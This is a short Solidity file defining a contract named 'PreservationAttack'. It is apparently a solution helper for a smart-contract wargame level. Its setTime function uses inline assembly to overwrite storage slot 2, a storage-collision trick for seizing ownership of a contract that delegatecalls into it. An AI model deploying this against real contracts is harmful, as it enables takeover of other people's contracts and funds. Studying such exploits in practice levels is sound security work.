// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract PreservationAttack {

    constructor(){

    }
    function setTime(uint256 _time) public {
        assembly {
            sstore(2, _time)
        }
    }
}
